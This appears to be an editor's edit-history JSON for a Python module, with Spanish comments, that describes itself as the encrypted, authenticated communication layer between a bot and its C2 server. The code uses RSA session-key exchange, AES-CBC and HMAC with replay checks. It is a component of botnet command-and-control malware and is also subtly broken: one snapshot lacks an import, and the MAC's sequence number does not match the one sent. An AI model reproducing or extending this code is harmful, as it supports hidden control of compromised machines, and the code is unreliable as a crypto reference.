{
    "sourceFile": "src/modules/secure_comms.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 1,
            "patches": [
                {
                    "date": 1740262522224,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740262594726,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,289 @@\n+\"\"\"\r\n+Módulo de comunicaciones seguras.\r\n+Proporciona una capa de cifrado y autenticación para las comunicaciones\r\n+entre el bot y el servidor C2.\r\n+\"\"\"\r\n+\r\n+import socket\r\n+import ssl\r\n+import base64\r\n+import json\r\n+import os\r\n+import time\r\n+import threading\r\n+from typing import Optional, Dict, Any, Tuple\r\n+import logging\r\n+\r\n+from cryptography.hazmat.primitives import (\r\n+    padding, \r\n+    hashes, \r\n+    hmac, \r\n+    serialization\r\n+)\r\n+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\r\n+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\n+from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding\r\n+from cryptography.hazmat.backends import default_backend\r\n+\r\n+class SecureChannel:\r\n+    def __init__(self, is_server: bool = False):\r\n+        \"\"\"\r\n+        Inicializa el canal seguro.\r\n+        \r\n+        Args:\r\n+            is_server (bool): True si es el servidor, False si es cliente\r\n+        \"\"\"\r\n+        self.is_server = is_server\r\n+        self.session_key = None\r\n+        self.private_key = None\r\n+        self.public_key = None\r\n+        self.remote_public_key = None\r\n+        self.sequence_number = 0\r\n+        self.remote_sequence = 0\r\n+        self._generate_keys()\r\n+\r\n+    def _generate_keys(self) -> None:\r\n+        \"\"\"Genera par de claves RSA para el intercambio inicial.\"\"\"\r\n+        try:\r\n+            self.private_key = rsa.generate_private_key(\r\n+                public_exponent=65537,\r\n+                key_size=2048,\r\n+                backend=default_backend()\r\n+            )\r\n+            self.public_key = self.private_key.public_key()\r\n+        except Exception as e:\r\n+            logging.error(f\"Error generando claves: {e}\")\r\n+            raise\r\n+\r\n+    def establish_secure_connection(self, sock: socket.socket) -> bool:\r\n+        \"\"\"\r\n+        Establece una conexión segura con intercambio de claves.\r\n+        \r\n+        Args:\r\n+            sock (socket.socket): Socket para la conexión\r\n+            \r\n+        Returns:\r\n+            bool: True si la conexión se estableció correctamente\r\n+        \"\"\"\r\n+        try:\r\n+            if self.is_server:\r\n+                return self._server_handshake(sock)\r\n+            else:\r\n+                return self._client_handshake(sock)\r\n+        except Exception as e:\r\n+            logging.error(f\"Error en establecimiento de conexión: {e}\")\r\n+            return False\r\n+\r\n+    def _server_handshake(self, sock: socket.socket) -> bool:\r\n+        \"\"\"Realiza el handshake desde el lado del servidor.\"\"\"\r\n+        try:\r\n+            # 1. Enviar nuestro certificado/clave pública\r\n+            public_bytes = self.public_key.public_bytes(\r\n+                encoding=serialization.Encoding.PEM,\r\n+                format=serialization.PublicFormat.SubjectPublicKeyInfo\r\n+            )\r\n+            sock.sendall(public_bytes)\r\n+            \r\n+            # 2. Recibir clave pública del cliente\r\n+            client_key_bytes = sock.recv(4096)\r\n+            self.remote_public_key = serialization.load_pem_public_key(\r\n+                client_key_bytes,\r\n+                backend=default_backend()\r\n+            )\r\n+            \r\n+            # 3. Recibir clave de sesión cifrada\r\n+            encrypted_session_key = sock.recv(512)\r\n+            self.session_key = self.private_key.decrypt(\r\n+                encrypted_session_key,\r\n+                asym_padding.OAEP(\r\n+                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),\r\n+                    algorithm=hashes.SHA256(),\r\n+                    label=None\r\n+                )\r\n+            )\r\n+            \r\n+            return True\r\n+        except Exception as e:\r\n+            logging.error(f\"Error en handshake del servidor: {e}\")\r\n+            return False\r\n+\r\n+    def _client_handshake(self, sock: socket.socket) -> bool:\r\n+        \"\"\"Realiza el handshake desde el lado del cliente.\"\"\"\r\n+        try:\r\n+            # 1. Recibir clave pública del servidor\r\n+            server_key_bytes = sock.recv(4096)\r\n+            self.remote_public_key = serialization.load_pem_public_key(\r\n+                server_key_bytes,\r\n+                backend=default_backend()\r\n+            )\r\n+            \r\n+            # 2. Enviar nuestra clave pública\r\n+            public_bytes = self.public_key.public_bytes(\r\n+                encoding=serialization.Encoding.PEM,\r\n+                format=serialization.PublicFormat.SubjectPublicKeyInfo\r\n+            )\r\n+            sock.sendall(public_bytes)\r\n+            \r\n+            # 3. Generar y enviar clave de sesión\r\n+            self.session_key = os.urandom(32)\r\n+            encrypted_session_key = self.remote_public_key.encrypt(\r\n+                self.session_key,\r\n+                asym_padding.OAEP(\r\n+                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),\r\n+                    algorithm=hashes.SHA256(),\r\n+                    label=None\r\n+                )\r\n+            )\r\n+            sock.sendall(encrypted_session_key)\r\n+            \r\n+            return True\r\n+        except Exception as e:\r\n+            logging.error(f\"Error en handshake del cliente: {e}\")\r\n+            return False\r\n+\r\n+    def encrypt_message(self, message: bytes) -> bytes:\r\n+        \"\"\"\r\n+        Cifra un mensaje usando la clave de sesión.\r\n+        \r\n+        Args:\r\n+            message (bytes): Mensaje a cifrar\r\n+            \r\n+        Returns:\r\n+            bytes: Mensaje cifrado con MAC y número de secuencia\r\n+        \"\"\"\r\n+        try:\r\n+            # Generar IV aleatorio\r\n+            iv = os.urandom(16)\r\n+            \r\n+            # Crear cipher\r\n+            cipher = Cipher(\r\n+                algorithms.AES(self.session_key),\r\n+                modes.CBC(iv),\r\n+                backend=default_backend()\r\n+            )\r\n+            \r\n+            # Añadir padding\r\n+            padder = padding.PKCS7(128).padder()\r\n+            padded_data = padder.update(message) + padder.finalize()\r\n+            \r\n+            # Cifrar\r\n+            encryptor = cipher.encryptor()\r\n+            ciphertext = encryptor.update(padded_data) + encryptor.finalize()\r\n+            \r\n+            # Crear MAC\r\n+            h = hmac.HMAC(self.session_key, hashes.SHA256(), backend=default_backend())\r\n+            h.update(iv + ciphertext + self.sequence_number.to_bytes(8, 'big'))\r\n+            mac = h.finalize()\r\n+            \r\n+            # Incrementar número de secuencia\r\n+            self.sequence_number += 1\r\n+            \r\n+            # Formato final: IV + ciphertext + MAC + sequence_number\r\n+            return iv + ciphertext + mac + self.sequence_number.to_bytes(8, 'big')\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error cifrando mensaje: {e}\")\r\n+            raise\r\n+\r\n+    def decrypt_message(self, encrypted_message: bytes) -> Optional[bytes]:\r\n+        \"\"\"\r\n+        Descifra un mensaje.\r\n+        \r\n+        Args:\r\n+            encrypted_message (bytes): Mensaje cifrado\r\n+            \r\n+        Returns:\r\n+            Optional[bytes]: Mensaje descifrado o None si hay error\r\n+        \"\"\"\r\n+        try:\r\n+            # Separar componentes\r\n+            iv = encrypted_message[:16]\r\n+            mac = encrypted_message[-40:-8]\r\n+            received_sequence = int.from_bytes(encrypted_message[-8:], 'big')\r\n+            ciphertext = encrypted_message[16:-40]\r\n+            \r\n+            # Verificar secuencia\r\n+            if received_sequence <= self.remote_sequence:\r\n+                logging.warning(\"Posible ataque de replay detectado\")\r\n+                return None\r\n+            self.remote_sequence = received_sequence\r\n+            \r\n+            # Verificar MAC\r\n+            h = hmac.HMAC(self.session_key, hashes.SHA256(), backend=default_backend())\r\n+            h.update(iv + ciphertext + received_sequence.to_bytes(8, 'big'))\r\n+            try:\r\n+                h.verify(mac)\r\n+            except:\r\n+                logging.warning(\"MAC inválido - posible manipulación\")\r\n+                return None\r\n+            \r\n+            # Descifrar\r\n+            cipher = Cipher(\r\n+                algorithms.AES(self.session_key),\r\n+                modes.CBC(iv),\r\n+                backend=default_backend()\r\n+            )\r\n+            decryptor = cipher.decryptor()\r\n+            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()\r\n+            \r\n+            # Quitar padding\r\n+            unpadder = padding.PKCS7(128).unpadder()\r\n+            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()\r\n+            \r\n+            return plaintext\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error descifrando mensaje: {e}\")\r\n+            return None\r\n+\r\n+    def send_secure(self, sock: socket.socket, data: bytes) -> bool:\r\n+        \"\"\"\r\n+        Envía datos de forma segura.\r\n+        \r\n+        Args:\r\n+            sock (socket.socket): Socket para enviar\r\n+            data (bytes): Datos a enviar\r\n+            \r\n+        Returns:\r\n+            bool: True si se envió correctamente\r\n+        \"\"\"\r\n+        try:\r\n+            encrypted = self.encrypt_message(data)\r\n+            length = len(encrypted).to_bytes(4, 'big')\r\n+            sock.sendall(length + encrypted)\r\n+            return True\r\n+        except Exception as e:\r\n+            logging.error(f\"Error enviando datos seguros: {e}\")\r\n+            return False\r\n+\r\n+    def receive_secure(self, sock: socket.socket) -> Optional[bytes]:\r\n+        \"\"\"\r\n+        Recibe datos de forma segura.\r\n+        \r\n+        Args:\r\n+            sock (socket.socket): Socket para recibir\r\n+            \r\n+        Returns:\r\n+            Optional[bytes]: Datos recibidos o None si hay error\r\n+        \"\"\"\r\n+        try:\r\n+            # Recibir longitud\r\n+            length_bytes = sock.recv(4)\r\n+            if not length_bytes:\r\n+                return None\r\n+            length = int.from_bytes(length_bytes, 'big')\r\n+            \r\n+            # Recibir datos\r\n+            data = b\"\"\r\n+            while len(data) < length:\r\n+                chunk = sock.recv(min(4096, length - len(data)))\r\n+                if not chunk:\r\n+                    return None\r\n+                data += chunk\r\n+            \r\n+            # Descifrar\r\n+            return self.decrypt_message(data)\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error recibiendo datos seguros: {e}\")\r\n+            return None\r\n"
                }
            ],
            "date": 1740262522224,
            "name": "Commit-0",
            "content": "\"\"\"\r\nMódulo de comunicaciones seguras.\r\nProporciona una capa de cifrado y autenticación para las comunicaciones\r\nentre el bot y el servidor C2.\r\n\"\"\"\r\n\r\nimport socket\r\nimport ssl\r\nimport base64\r\nimport json\r\nimport os\r\nimport time\r\nimport threading\r\nfrom typing import Optional, Dict, Any, Tuple\r\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\r\nfrom cryptography.hazmat.primitives import padding, hashes, hmac\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\nfrom cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding\r\nfrom cryptography.hazmat.backends import default_backend\r\nimport logging\r\n\r\nclass SecureChannel:\r\n    def __init__(self, is_server: bool = False):\r\n        \"\"\"\r\n        Inicializa el canal seguro.\r\n        \r\n        Args:\r\n            is_server (bool): True si es el servidor, False si es cliente\r\n        \"\"\"\r\n        self.is_server = is_server\r\n        self.session_key = None\r\n        self.private_key = None\r\n        self.public_key = None\r\n        self.remote_public_key = None\r\n        self.sequence_number = 0\r\n        self.remote_sequence = 0\r\n        self._generate_keys()\r\n\r\n    def _generate_keys(self) -> None:\r\n        \"\"\"Genera par de claves RSA para el intercambio inicial.\"\"\"\r\n        try:\r\n            self.private_key = rsa.generate_private_key(\r\n                public_exponent=65537,\r\n                key_size=2048,\r\n                backend=default_backend()\r\n            )\r\n            self.public_key = self.private_key.public_key()\r\n        except Exception as e:\r\n            logging.error(f\"Error generando claves: {e}\")\r\n            raise\r\n\r\n    def establish_secure_connection(self, sock: socket.socket) -> bool:\r\n        \"\"\"\r\n        Establece una conexión segura con intercambio de claves.\r\n        \r\n        Args:\r\n            sock (socket.socket): Socket para la conexión\r\n            \r\n        Returns:\r\n            bool: True si la conexión se estableció correctamente\r\n        \"\"\"\r\n        try:\r\n            if self.is_server:\r\n                return self._server_handshake(sock)\r\n            else:\r\n                return self._client_handshake(sock)\r\n        except Exception as e:\r\n            logging.error(f\"Error en establecimiento de conexión: {e}\")\r\n            return False\r\n\r\n    def _server_handshake(self, sock: socket.socket) -> bool:\r\n        \"\"\"Realiza el handshake desde el lado del servidor.\"\"\"\r\n        try:\r\n            # 1. Enviar nuestro certificado/clave pública\r\n            public_bytes = self.public_key.public_bytes(\r\n                encoding=serialization.Encoding.PEM,\r\n                format=serialization.PublicFormat.SubjectPublicKeyInfo\r\n            )\r\n            sock.sendall(public_bytes)\r\n            \r\n            # 2. Recibir clave pública del cliente\r\n            client_key_bytes = sock.recv(4096)\r\n            self.remote_public_key = serialization.load_pem_public_key(\r\n                client_key_bytes,\r\n                backend=default_backend()\r\n            )\r\n            \r\n            # 3. Recibir clave de sesión cifrada\r\n            encrypted_session_key = sock.recv(512)\r\n            self.session_key = self.private_key.decrypt(\r\n                encrypted_session_key,\r\n                asym_padding.OAEP(\r\n                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),\r\n                    algorithm=hashes.SHA256(),\r\n                    label=None\r\n                )\r\n            )\r\n            \r\n            return True\r\n        except Exception as e:\r\n            logging.error(f\"Error en handshake del servidor: {e}\")\r\n            return False\r\n\r\n    def _client_handshake(self, sock: socket.socket) -> bool:\r\n        \"\"\"Realiza el handshake desde el lado del cliente.\"\"\"\r\n        try:\r\n            # 1. Recibir clave pública del servidor\r\n            server_key_bytes = sock.recv(4096)\r\n            self.remote_public_key = serialization.load_pem_public_key(\r\n                server_key_bytes,\r\n                backend=default_backend()\r\n            )\r\n            \r\n            # 2. Enviar nuestra clave pública\r\n            public_bytes = self.public_key.public_bytes(\r\n                encoding=serialization.Encoding.PEM,\r\n                format=serialization.PublicFormat.SubjectPublicKeyInfo\r\n            )\r\n            sock.sendall(public_bytes)\r\n            \r\n            # 3. Generar y enviar clave de sesión\r\n            self.session_key = os.urandom(32)\r\n            encrypted_session_key = self.remote_public_key.encrypt(\r\n                self.session_key,\r\n                asym_padding.OAEP(\r\n                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),\r\n                    algorithm=hashes.SHA256(),\r\n                    label=None\r\n                )\r\n            )\r\n            sock.sendall(encrypted_session_key)\r\n            \r\n            return True\r\n        except Exception as e:\r\n            logging.error(f\"Error en handshake del cliente: {e}\")\r\n            return False\r\n\r\n    def encrypt_message(self, message: bytes) -> bytes:\r\n        \"\"\"\r\n        Cifra un mensaje usando la clave de sesión.\r\n        \r\n        Args:\r\n            message (bytes): Mensaje a cifrar\r\n            \r\n        Returns:\r\n            bytes: Mensaje cifrado con MAC y número de secuencia\r\n        \"\"\"\r\n        try:\r\n            # Generar IV aleatorio\r\n            iv = os.urandom(16)\r\n            \r\n            # Crear cipher\r\n            cipher = Cipher(\r\n                algorithms.AES(self.session_key),\r\n                modes.CBC(iv),\r\n                backend=default_backend()\r\n            )\r\n            \r\n            # Añadir padding\r\n            padder = padding.PKCS7(128).padder()\r\n            padded_data = padder.update(message) + padder.finalize()\r\n            \r\n            # Cifrar\r\n            encryptor = cipher.encryptor()\r\n            ciphertext = encryptor.update(padded_data) + encryptor.finalize()\r\n            \r\n            # Crear MAC\r\n            h = hmac.HMAC(self.session_key, hashes.SHA256(), backend=default_backend())\r\n            h.update(iv + ciphertext + self.sequence_number.to_bytes(8, 'big'))\r\n            mac = h.finalize()\r\n            \r\n            # Incrementar número de secuencia\r\n            self.sequence_number += 1\r\n            \r\n            # Formato final: IV + ciphertext + MAC + sequence_number\r\n            return iv + ciphertext + mac + self.sequence_number.to_bytes(8, 'big')\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error cifrando mensaje: {e}\")\r\n            raise\r\n\r\n    def decrypt_message(self, encrypted_message: bytes) -> Optional[bytes]:\r\n        \"\"\"\r\n        Descifra un mensaje.\r\n        \r\n        Args:\r\n            encrypted_message (bytes): Mensaje cifrado\r\n            \r\n        Returns:\r\n            Optional[bytes]: Mensaje descifrado o None si hay error\r\n        \"\"\"\r\n        try:\r\n            # Separar componentes\r\n            iv = encrypted_message[:16]\r\n            mac = encrypted_message[-40:-8]\r\n            received_sequence = int.from_bytes(encrypted_message[-8:], 'big')\r\n            ciphertext = encrypted_message[16:-40]\r\n            \r\n            # Verificar secuencia\r\n            if received_sequence <= self.remote_sequence:\r\n                logging.warning(\"Posible ataque de replay detectado\")\r\n                return None\r\n            self.remote_sequence = received_sequence\r\n            \r\n            # Verificar MAC\r\n            h = hmac.HMAC(self.session_key, hashes.SHA256(), backend=default_backend())\r\n            h.update(iv + ciphertext + received_sequence.to_bytes(8, 'big'))\r\n            try:\r\n                h.verify(mac)\r\n            except:\r\n                logging.warning(\"MAC inválido - posible manipulación\")\r\n                return None\r\n            \r\n            # Descifrar\r\n            cipher = Cipher(\r\n                algorithms.AES(self.session_key),\r\n                modes.CBC(iv),\r\n                backend=default_backend()\r\n            )\r\n            decryptor = cipher.decryptor()\r\n            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()\r\n            \r\n            # Quitar padding\r\n            unpadder = padding.PKCS7(128).unpadder()\r\n            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()\r\n            \r\n            return plaintext\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error descifrando mensaje: {e}\")\r\n            return None\r\n\r\n    def send_secure(self, sock: socket.socket, data: bytes) -> bool:\r\n        \"\"\"\r\n        Envía datos de forma segura.\r\n        \r\n        Args:\r\n            sock (socket.socket): Socket para enviar\r\n            data (bytes): Datos a enviar\r\n            \r\n        Returns:\r\n            bool: True si se envió correctamente\r\n        \"\"\"\r\n        try:\r\n            encrypted = self.encrypt_message(data)\r\n            length = len(encrypted).to_bytes(4, 'big')\r\n            sock.sendall(length + encrypted)\r\n            return True\r\n        except Exception as e:\r\n            logging.error(f\"Error enviando datos seguros: {e}\")\r\n            return False\r\n\r\n    def receive_secure(self, sock: socket.socket) -> Optional[bytes]:\r\n        \"\"\"\r\n        Recibe datos de forma segura.\r\n        \r\n        Args:\r\n            sock (socket.socket): Socket para recibir\r\n            \r\n        Returns:\r\n            Optional[bytes]: Datos recibidos o None si hay error\r\n        \"\"\"\r\n        try:\r\n            # Recibir longitud\r\n            length_bytes = sock.recv(4)\r\n            if not length_bytes:\r\n                return None\r\n            length = int.from_bytes(length_bytes, 'big')\r\n            \r\n            # Recibir datos\r\n            data = b\"\"\r\n            while len(data) < length:\r\n                chunk = sock.recv(min(4096, length - len(data)))\r\n                if not chunk:\r\n                    return None\r\n                data += chunk\r\n            \r\n            # Descifrar\r\n            return self.decrypt_message(data)\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error recibiendo datos seguros: {e}\")\r\n            return None\r\n"
        }
    ]
}